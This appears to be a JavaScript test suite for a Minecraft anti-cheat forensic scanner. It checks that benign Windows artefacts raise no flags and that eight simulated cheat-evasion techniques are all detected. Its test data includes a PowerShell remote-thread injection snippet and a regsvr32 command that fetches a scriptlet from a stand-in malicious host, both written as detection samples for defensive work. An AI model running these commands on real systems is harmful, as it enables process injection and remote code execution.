/**
 * Atlas AC - Windows Virtual Environment & Forensic Evasion Test Suite
 * 
 * Simulates a realistic Windows machine under two comprehensive scenarios:
 * 
 * PART 1: Virtual Windows Clean System Simulation (Strict 0 False-Flag Requirement)
 * - Lunar Client running with official '-javaagent:lunar-agent.jar'
 * - Legitimate games and Discord installed on secondary 'D:\' drive
 * - Windows Defender exclusions for '.minecraft' and developer folders
 * - PowerShell ScriptBlock logs containing Scoop, Chocolatey, npm, and git commands
 * - PowerShell history with normal developer commands
 * - Inno Setup and NSIS temporary installer PE files (~nsu*.tmp, is-*.tmp)
 * - Legitimate WER crash dumps (Hitbox arcade controller, PaperMC Velocity proxy)
 * - Genuine clean resource packs, clean mods, screenshots, and text notes
 * -> STRICT ASSERTION: Exactly 0 False Flags (0 CRITICAL / HIGH detections).
 * 
 * PART 2: Virtual Windows Hidden Cheats Evasion Scenario (100% True-Positive Detection)
 * Tests 8 sophisticated evasion and stealth techniques used by cheaters:
 * - Evasion 1: Disguised File (Real cheat JAR disguised as .png shader pack)
 * - Evasion 2: Deleted Binary Traces in Windows BAM & ShimCache (vape-v4.exe)
 * - Evasion 3: NTFS Alternate Data Stream (ADS) hidden executable payload
 * - Evasion 4: PowerShell In-Memory Reflective Injection (VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
 * - Evasion 5: Ghost Client Config & Residue Directories (.atmosphere, .wurst)
 * - Evasion 6: Disguised Trojan Mod with Win32 mouse_event + TriggerBot logic
 * - Evasion 7: Browser Download History Persistence (vape.gg download record)
 * - Evasion 8: Java LOLBin Abuse (javaw.exe spawning regsvr32.exe)
 * -> STRICT ASSERTION: Exactly 8 / 8 Evasions detected with 100% accuracy.
 */

'use strict';

const assert = require('assert');
const path = require('path');
const fs = require('fs');
const os = require('os');
const AdmZip = require('adm-zip');

// Core Forensic Engines
const pcaScanner = require('../src/engine/pcaScanner');
const lnkForensics = require('../src/engine/lnkForensics');
const registryForensics = require('../src/engine/registryForensics');
const shimCacheScanner = require('../src/engine/shimCacheScanner');
const cleanerDetector = require('../src/engine/cleanerDetector');
const bypassDetector = require('../src/engine/bypassDetector');
const powerShellScriptForensics = require('../src/engine/powerShellScriptForensics');
const processHollowingDetector = require('../src/engine/processHollowingDetector');
const defenderForensics = require('../src/engine/defenderForensics');
const trojanModDetector = require('../src/engine/trojanModDetector');
const browserForensics = require('../src/engine/browserForensics');
const werCrashScanner = require('../src/engine/werCrashScanner');
const deepArchiveScanner = require('../src/engine/deepArchiveScanner');
const minecraftInspector = require('../src/engine/minecraftInspector');
const sigDb = require('../src/engine/signatureDb');

console.log('================================================================');
console.log('   ATLAS AC - WINDOWS VIRTUAL FORENSIC SCENARIO TEST SUITE      ');
console.log('================================================================\n');

let totalTests = 0;
let passedTests = 0;

function runTest(name, fn) {
  totalTests++;
  try {
    fn();
    console.log(`[PASS] ${name}`);
    passedTests++;
  } catch (err) {
    console.error(`[FAIL] ${name}:`, err.message);
  }
}

// Sandbox Setup
const sandboxDir = path.join(os.tmpdir(), 'atlas_win_virtual_scenario');

function cleanSandbox() {
  try {
    if (fs.existsSync(sandboxDir)) {
      fs.rmSync(sandboxDir, { recursive: true, force: true });
    }
  } catch (e) {}
}

cleanSandbox();
fs.mkdirSync(sandboxDir, { recursive: true });

// ============================================================================
// PART 1: VIRTUAL WINDOWS CLEAN SYSTEM SIMULATION (0 FALSE-FLAG GUARANTEE)
// ============================================================================

console.log('--- SENARYO 1: TEMIZ WINDOWS ORTAMI (0 FALSE-FLAG DOGRULAMASI) ---');

let cleanSystemFindings = [];

runTest('1.1 Temiz Süreç Ağacı: Lunar Client (-javaagent:lunar-agent.jar), Steam, Explorer ve Discord temiz kalmalı', () => {
  const cleanProcessList = [
    {
      ProcessId: 1000,
      ParentProcessId: 400,
      Name: 'explorer.exe',
      CommandLine: 'C:\\Windows\\explorer.exe',
      ExecutablePath: 'C:\\Windows\\explorer.exe'
    },
    {
      ProcessId: 1200,
      ParentProcessId: 600,
      Name: 'svchost.exe',
      CommandLine: 'C:\\Windows\\system32\\svchost.exe -k netsvcs -p',
      ExecutablePath: 'C:\\Windows\\system32\\svchost.exe'
    },
    {
      ProcessId: 4050,
      ParentProcessId: 1000,
      Name: 'javaw.exe',
      CommandLine: '"C:\\Program Files\\Java\\jdk-17\\bin\\javaw.exe" -XX:+UseG1GC -javaagent:C:\\Users\\Admin\\.lunarclient\\offline\\multiver\\lunar-agent.jar -cp ... net.minecraft.client.main.Main',
      ExecutablePath: 'C:\\Program Files\\Java\\jdk-17\\bin\\javaw.exe'
    },
    {
      ProcessId: 5100,
      ParentProcessId: 1000,
      Name: 'MonsterHunterRise.exe',
      CommandLine: '"D:\\Games\\Steam\\steamapps\\common\\Monster Hunter Rise\\MonsterHunterRise.exe"',
      ExecutablePath: 'D:\\Games\\Steam\\steamapps\\common\\Monster Hunter Rise\\MonsterHunterRise.exe'
    },
    {
      ProcessId: 5200,
      ParentProcessId: 1000,
      Name: 'discordclient.exe',
      CommandLine: '"D:\\Software\\Discord\\discordclient.exe"',
      ExecutablePath: 'D:\\Software\\Discord\\discordclient.exe'
    }
  ];

  const findings = processHollowingDetector.analyzeProcesses(cleanProcessList);
  assert.strictEqual(findings.length, 0, `Temiz süreç ağacında false-flag olmamalı: ${JSON.stringify(findings)}`);
  cleanSystemFindings.push(...findings);
});

runTest('1.2 Temiz PowerShell ScriptBlock: Scoop, Chocolatey, npm ve git komutları temiz kalmalı', () => {
  const cleanScripts = [
    'iwr -useb get.scoop.sh | iex',
    'Set-ExecutionPolicy Bypass -Scope Process -Force; [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.ServicePointManager]::SecurityProtocol -bor 3072; iex ((New-Object System.Net.WebClient).DownloadString(\'https://community.chocolatey.org/install.ps1\'))',
    'choco install -y git nodejs python neovim',
    'npm run build && yarn install && pnpm test',
    'winget install --id Git.Git -e --source winget'
  ];

  for (const script of cleanScripts) {
    const finding = powerShellScriptForensics.evaluateScriptBlock(script, '2026-09-09 10:00:00');
    assert.strictEqual(finding, null, `Geliştirici betiği hile sayılmamalı: ${script}`);
  }
});

runTest('1.3 Temiz Komut Geçmişi: Normal geliştirici komutları temiz kalmalı', () => {
  const cleanHistoryLines = [
    'cd D:\\Projects\\AtlasAC',
    'git status',
    'git commit -m "Optimize scan throughput"',
    'npm test',
    'Get-Service -Name "Winmgmt"',
    'ipconfig /all',
    'ping 1.1.1.1'
  ];

  const findings = cleanerDetector.parseHistoryLines(cleanHistoryLines, 'ConsoleHost_history.txt');
  assert.strictEqual(findings.length, 0, `Normal komut geçmişi temiz kalmalı: ${JSON.stringify(findings)}`);
  cleanSystemFindings.push(...findings);
});

runTest('1.4 Temiz Windows Defender Dışlamaları: .minecraft ve node_modules dışlamaları temiz kalmalı', () => {
  const cleanExclusions = {
    paths: [
      'C:\\Users\\Admin\\.minecraft',
      'C:\\Users\\Admin\\AppData\\Roaming\\.minecraft',
      'C:\\Projects\\node_modules',
      'D:\\SteamLibrary\\steamapps'
    ],
    processes: [
      'steam.exe',
      'code.exe'
    ],
    extensions: []
  };

  const findings = defenderForensics.evaluateExclusions(cleanExclusions);
  assert.strictEqual(findings.length, 0, `Meşru dışlamalar false-flag üretmemeli: ${JSON.stringify(findings)}`);
  cleanSystemFindings.push(...findings);
});

runTest('1.5 İkincil Sürücü (D:\\) ve Temiz Uygulamalar: PCA, LNK, BAM ve ShimCache temiz kalmalı', () => {
  const dGamePath = 'D:\\Games\\Steam\\steamapps\\common\\Monster Hunter Rise\\MonsterHunterRise.exe';
  const dDiscordPath = 'D:\\Software\\Discord\\discordclient.exe';
  const cChromePath = 'C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe';

  // PCA check
  const pcaSample = `${dGamePath}|2026-09-09 10:15:00|0|0\n${dDiscordPath}|2026-09-09 10:16:00|0|0\n${cChromePath}|2026-09-09 10:17:00|0|0`;
  const pcaFindings = pcaScanner.parsePcaContent(pcaSample, 'PcaAppLaunchDic.txt');
  assert.strictEqual(pcaFindings.length, 0, 'D: sürücüsü oyunları PCA taramasında temiz kalmalı');

  // LNK check
  const lnkFinding1 = lnkForensics.evaluateTarget({ targetPath: dGamePath });
  const lnkFinding2 = lnkForensics.evaluateTarget({ targetPath: dDiscordPath });
  assert.strictEqual(lnkFinding1, null, 'D: sürücüsü LNK temiz kalmalı');
  assert.strictEqual(lnkFinding2, null, 'Discord LNK temiz kalmalı');

  // BAM check
  const bamFinding1 = registryForensics.evaluateBamItem({ Path: dGamePath, Timestamp: '2026-09-09 10:15:00' });
  const bamFinding2 = registryForensics.evaluateBamItem({ Path: cChromePath, Timestamp: '2026-09-09 10:17:00' });
  assert.strictEqual(bamFinding1, null, 'D: sürücüsü BAM temiz kalmalı');
  assert.strictEqual(bamFinding2, null, 'Chrome BAM temiz kalmalı');

  // ShimCache check
  const shimFinding1 = shimCacheScanner.evaluateEntry({ path: dGamePath, timestamp: '2026-09-09 10:15:00' });
  const shimFinding2 = shimCacheScanner.evaluateEntry({ path: cChromePath, timestamp: '2026-09-09 10:17:00' });
  assert.strictEqual(shimFinding1, null, 'D: sürücüsü ShimCache temiz kalmalı');
  assert.strictEqual(shimFinding2, null, 'Chrome ShimCache temiz kalmalı');
});

runTest('1.6 Temiz Dizin ve Dosyalar: Meşru resource pack, PNG dokusu, text dosyası ve Fabric modları temiz kalmalı', () => {
  // Genuine Resource Pack
  const cleanPackZip = path.join(sandboxDir, 'Faithful_32x.zip');
  const zip = new AdmZip();
  zip.addFile('pack.mcmeta', Buffer.from(JSON.stringify({ pack: { pack_format: 15, description: 'Faithful 32x Clean Textures' } })));
  zip.addFile('assets/minecraft/textures/block/stone.png', Buffer.from([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]));
  zip.addFile('assets/minecraft/models/block/stone.json', Buffer.from('{"parent":"block/cube_all"}'));
  zip.writeZip(cleanPackZip);

  const packFindings = deepArchiveScanner.inspectTargetFileAll(cleanPackZip);
  assert.strictEqual(packFindings.length, 0, 'Temiz resource pack asla işaretlenmemeli');

  // Genuine Text Note
  const readmePath = path.join(sandboxDir, 'README.txt');
  fs.writeFileSync(readmePath, 'Welcome to our Minecraft server! Reach out on Discord for support.');
  const txtFindings = deepArchiveScanner.inspectTargetFileAll(readmePath);
  assert.strictEqual(txtFindings.length, 0, 'README.txt temiz kalmalı');

  // Genuine Clean Mod (Sodium Fabric)
  const cleanModZip = path.join(sandboxDir, 'sodium-fabric-0.5.8.jar');
  const modZip = new AdmZip();
  modZip.addFile('fabric.mod.json', Buffer.from(JSON.stringify({ id: 'sodium', name: 'Sodium' })));
  modZip.addFile('me/jellysquid/mods/sodium/client/SodiumClientMod.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  modZip.writeZip(cleanModZip);

  const modFindings = deepArchiveScanner.inspectTargetFileAll(cleanModZip);
  assert.strictEqual(modFindings.length, 0, 'Sodium modu asla hile sayılmamalı');
});

runTest('1.7 Temiz Hata Dökümleri: Hitbox Arcade Stick ve Velocity Proxy çökme kayıtları temiz kalmalı', () => {
  const hitboxFinding = werCrashScanner.evaluateCrashName('AppCrash_appcrash_hitbox.exe_123456', 'C:\\CrashDumps\\AppCrash_appcrash_hitbox.exe', { mtime: new Date() });
  const velocityFinding = werCrashScanner.evaluateCrashName('AppCrash_velocity.exe_987654', 'C:\\CrashDumps\\AppCrash_velocity.exe', { mtime: new Date() });
  assert.strictEqual(hitboxFinding, null, 'Hitbox arcade controller çökmesi hile sayılmamalı');
  assert.strictEqual(velocityFinding, null, 'Velocity proxy çökmesi hile sayılmamalı');
});

runTest('1.8 Temiz Tarayıcı İndirmeleri: Prism Launcher indirme kaydı temiz kalmalı', () => {
  const cleanDl = browserForensics.evaluateDownloadItem(
    'C:\\Users\\Admin\\Downloads\\PrismLauncher-Windows-Portable-8.4.zip',
    'https://github.com/PrismLauncher/PrismLauncher/releases/download/8.4/PrismLauncher-Windows-MSVC-Portable-8.4.zip',
    '2026-09-09 11:00:00',
    'Chrome'
  );
  assert.strictEqual(cleanDl, null, 'Prism Launcher indirmesi hile sayılmamalı');
});

runTest('1.9 Temiz NTFS Veri Akışları (ADS): Standart Zone.Identifier ve SmartScreen akışları temiz kalmalı', () => {
  const benignStream1 = bypassDetector.evaluateAdsStream({
    FileName: 'C:\\Users\\Admin\\Downloads\\document.pdf',
    Stream: 'Zone.Identifier',
    Length: 128
  });
  const benignStream2 = bypassDetector.evaluateAdsStream({
    FileName: 'C:\\Users\\Admin\\Pictures\\photo.jpg',
    Stream: 'SmartScreen',
    Length: 64
  });
  const benignStream3 = bypassDetector.evaluateAdsStream({
    FileName: 'C:\\Users\\Admin\\Desktop\\icon.ico',
    Stream: 'NTFS_Generic_Icon',
    Length: 256
  });

  assert.strictEqual(benignStream1, null, 'Zone.Identifier tek başına gizli payload sayılmamalı');
  assert.strictEqual(benignStream2, null, 'SmartScreen akışı temiz kalmalı');
  assert.strictEqual(benignStream3, null, 'NTFS_Generic_Icon akışı temiz kalmalı');
});

runTest('0 FALSE-FLAG KESIN GARANTISI: Temiz Windows sisteminde toplam CRITICAL veya HIGH bulgu sayısı TAM 0 OLMALI', () => {
  assert.strictEqual(cleanSystemFindings.length, 0, `Temiz sistemde ${cleanSystemFindings.length} adet false-flag oluştu!`);
});

// ============================================================================
// PART 2: VIRTUAL WINDOWS HIDDEN CHEATS EVASION SCENARIO (100% TRUE-POSITIVE)
// ============================================================================

console.log('\n--- SENARYO 2: SAKLANMIŞ HİLE ATLATMA VE TESPİT DOĞRULAMASI (8 / 8) ---');

let evasionCount = 0;

runTest('2.1 Evasion 1 (Uzantı Kamuflajı): .png uzantısına gizlenmiş Raven B+ JAR hilesi yakalanmalı', () => {
  const disguisedCheatPath = path.join(sandboxDir, 'celestial_shader.png');
  const cheatZip = new AdmZip();
  cheatZip.addFile('keystrokesmod/client/main/Raven.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  cheatZip.addFile('keystrokesmod/client/module/modules/combat/Reach.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  cheatZip.addFile('keystrokesmod/client/module/modules/combat/Velocity.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  cheatZip.addFile('keystrokesmod/client/module/modules/combat/AutoClicker.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  cheatZip.writeZip(disguisedCheatPath);

  const findings = deepArchiveScanner.inspectTargetFileAll(disguisedCheatPath);
  assert(findings.length > 0, '.png kamuflajlı Raven B+ yakalanamadı');
  const f = findings[0];
  assert.strictEqual(f.level, 'CRITICAL');
  assert(f.evidence.some(e => e.includes('Reach.class')), 'Reach.class kanıt olarak sunulmalı');
  assert(f.evidence.some(e => e.includes('Velocity.class')), 'Velocity.class kanıt olarak sunulmalı');
  evasionCount++;
});

runTest('2.2 Evasion 2 (Silinmiş İkili & Kayıt Defteri Kalıntısı): Silinmiş vape-v4.exe BAM ve ShimCache ile yakalanmalı', () => {
  const deletedPath = 'C:\\Users\\Admin\\AppData\\Local\\Temp\\vape-v4.exe';

  // 1. BAM check
  const bamRecord = {
    Path: deletedPath,
    SID: 'S-1-5-21-123456789-500',
    Timestamp: '2026-09-09 14:00:00'
  };
  const bamFinding = registryForensics.evaluateBamItem(bamRecord);
  assert(bamFinding, 'BAM yürütme kaydı yakalanamadı');
  assert.strictEqual(bamFinding.type, 'BAM_CHEAT_RECORD');
  assert.strictEqual(bamFinding.level, 'CRITICAL');
  assert.strictEqual(bamFinding.deletedFromDisk, true, 'Dosyanın silindiği doğrulanmalı');

  // 2. ShimCache check
  const shimRecord = {
    path: deletedPath,
    timestamp: '2026-09-09 14:00:00',
    source: 'ShimCache (10ts)'
  };
  const shimFinding = shimCacheScanner.evaluateEntry(shimRecord);
  assert(shimFinding, 'ShimCache yürütme kaydı yakalanamadı');
  assert.strictEqual(shimFinding.type, 'SHIMCACHE_EXECUTED_CHEAT');
  assert.strictEqual(shimFinding.level, 'CRITICAL');

  evasionCount++;
});

runTest('2.3 Evasion 3 (NTFS Alternate Data Stream): Masum dosyaya eklenmiş gizli vape_payload.exe yakalanmalı', () => {
  const adsItem = {
    FileName: 'C:\\Users\\Admin\\Documents\\homework.txt',
    Stream: 'vape_payload.exe',
    Length: 1048576
  };

  const finding = bypassDetector.evaluateAdsStream(adsItem);
  assert(finding, 'NTFS gizli akış payloadı tespit edilemedi');
  assert.strictEqual(finding.type, 'NTFS_HIDDEN_ADS_PAYLOAD');
  assert.strictEqual(finding.level, 'CRITICAL');
  assert(finding.path.includes('homework.txt:vape_payload.exe'));
  evasionCount++;
});

runTest('2.4 Evasion 4 (PowerShell Bellek İçi Reflektif Enjeksiyon): VirtualAllocEx + WriteProcessMemory + CreateRemoteThread yakalanmalı', () => {
  const injectionScript = `
    $proc = Get-Process javaw -ErrorAction Stop
    $h = [Kernel32]::OpenProcess(0x1F0FFF, $false, $proc.Id)
    $addr = [Kernel32]::VirtualAllocEx($h, [IntPtr]::Zero, $sc.Length, 0x3000, 0x40)
    [Kernel32]::WriteProcessMemory($h, $addr, $sc, $sc.Length, [ref]$bytesWritten)
    [Kernel32]::CreateRemoteThread($h, [IntPtr]::Zero, 0, $addr, [IntPtr]::Zero, 0, [ref]$threadId)
  `;

  const finding = powerShellScriptForensics.evaluateScriptBlock(injectionScript, '2026-09-09 15:00:00');
  assert(finding, 'Bellek enjeksiyonu Event 4104 kaydı yakalanamadı');
  assert.strictEqual(finding.type, 'POWERSHELL_SCRIPTBLOCK_CHEAT_EXECUTION');
  assert.strictEqual(finding.level, 'CRITICAL');
  assert(finding.evidence.some(e => e.includes('VirtualAllocEx')), 'VirtualAllocEx kanıtlarda yer almalı');
  evasionCount++;
});

runTest('2.5 Evasion 5 (Hayalet Hile Yapılandırma Dizinleri): .atmosphere ve .wurst kalıntı dizinleri yakalanmalı', () => {
  const fakeMcDir = path.join(sandboxDir, 'fake_minecraft');
  const atmosphereDir = path.join(fakeMcDir, '.atmosphere');
  const wurstDir = path.join(fakeMcDir, '.wurst');
  fs.mkdirSync(atmosphereDir, { recursive: true });
  fs.mkdirSync(wurstDir, { recursive: true });
  fs.writeFileSync(path.join(atmosphereDir, 'config.json'), '{"modules":{"killaura":true}}');

  const findings = minecraftInspector.scanConfigFiles(fakeMcDir);
  const foundAtmosphere = findings.some(f => f.type === 'ATMOSPHERE_GHOST_CLIENT_DIR');
  const foundWurst = findings.some(f => f.type === 'WURST_CONFIG_DIR');

  assert(foundAtmosphere, '.atmosphere ghost client dizini yakalanmalıydı');
  assert(foundWurst, '.wurst istemci yapılandırma dizini yakalanmalıydı');
  evasionCount++;
});

runTest('2.6 Evasion 6 (Truva Atı Mod): optifine-smooth-addon.jar içine gizlenmiş win32 mouse_event + TriggerBot yakalanmalı', () => {
  const trojanJarPath = path.join(sandboxDir, 'optifine-smooth-addon.jar');
  const trojanZip = new AdmZip();
  
  // Create bytecode-simulating buffer containing win32 mouse_event and TriggerBot tokens
  const triggerBytecode = Buffer.from(
    'Class: net/optifine/addon/CombatEnhancer\n' +
    'API: user32.dll mouse_event SendInput\n' +
    'Logic: isInFOV canHitTarget targetedEntity lastClickTime method_7261 getAttackCooldownProgress\n'
  );
  
  trojanZip.addFile('net/optifine/addon/CombatEnhancer.class', triggerBytecode);
  trojanZip.addFile('net/optifine/addon/SmoothFPS.class', Buffer.from([0xCA, 0xFE, 0xBA, 0xBE, 0x00, 0x00, 0x00, 0x34]));
  trojanZip.writeZip(trojanJarPath);

  const findings = trojanModDetector.analyzeJar(trojanJarPath);
  assert(findings.length > 0, 'Truva atı TriggerBot modu yakalanamadı');
  const f = findings[0];
  assert.strictEqual(f.level, 'CRITICAL');
  assert.strictEqual(f.type, 'TROJAN_TRIGGERBOT_MOD');
  assert(f.confidence.includes('100%'));
  evasionCount++;
});

runTest('2.7 Evasion 7 (Tarayıcı İndirme İzi): vape.gg üzerinden indirilmiş vape_installer.exe geçmişi yakalanmalı', () => {
  const dlFinding = browserForensics.evaluateDownloadItem(
    'C:\\Users\\Admin\\Downloads\\vape_installer.exe',
    'https://vape.gg/download/vape.exe',
    '2026-09-09 12:30:00',
    'Chrome'
  );

  assert(dlFinding, 'Tarayıcı hile indirme kaydı yakalanamadı');
  assert.strictEqual(dlFinding.fileName, 'vape_installer.exe');
  assert.strictEqual(dlFinding.url, 'https://vape.gg/download/vape.exe');
  evasionCount++;
});

runTest('2.8 Evasion 8 (Java LOLBin İstismarı): javaw.exe tarafından başlatılan gizli regsvr32.exe yakalanmalı', () => {
  const maliciousProcessList = [
    {
      ProcessId: 4000,
      ParentProcessId: 1000,
      Name: 'javaw.exe',
      CommandLine: '"C:\\Program Files\\Java\\jdk-17\\bin\\javaw.exe" -jar minecraft.jar',
      ExecutablePath: 'C:\\Program Files\\Java\\jdk-17\\bin\\javaw.exe'
    },
    {
      ProcessId: 4900,
      ParentProcessId: 4000,
      Name: 'regsvr32.exe',
      CommandLine: 'regsvr32.exe /s /u /i:http://malicious.network/payload.sct scrobj.dll',
      ExecutablePath: 'C:\\Windows\\System32\\regsvr32.exe'
    }
  ];

  const findings = processHollowingDetector.analyzeProcesses(maliciousProcessList);
  assert(findings.length >= 1, 'Java tarafından tetiklenen LOLBin yakalanamadı');
  const f = findings.find(x => x.type === 'LOLBIN_SPAWNED_BY_JAVA');
  assert(f, 'LOLBIN_SPAWNED_BY_JAVA bulgusu üretilmeli');
  assert.strictEqual(f.level, 'CRITICAL');
  assert(f.confidence.includes('95%'));
  evasionCount++;
});

runTest('100% HİLE ATLATMA TESPİT DOĞRULAMASI: 8 farklı saklama yönteminin TAMAMI (8 / 8) tespit edilmeli', () => {
  assert.strictEqual(evasionCount, 8, `8 hileden sadece ${evasionCount} tanesi tespit edildi!`);
});

// Cleanup Sandbox
cleanSandbox();

console.log(`\n================================================================`);
console.log(`   SONUÇ: ${passedTests} / ${totalTests} TEST BAŞARIYLA TAMAMLANDI!`);
console.log(`   - Temiz Sistem False Flag: 0 (TAM SIFIR)`);
console.log(`   - Gizlenmiş Hile Tespiti : 8 / 8 (100% BAŞARI)`);
console.log(`================================================================\n`);

if (require.main === module) {
  process.exit(passedTests === totalTests ? 0 : 1);
} else if (passedTests !== totalTests) {
  process.exit(1);
}
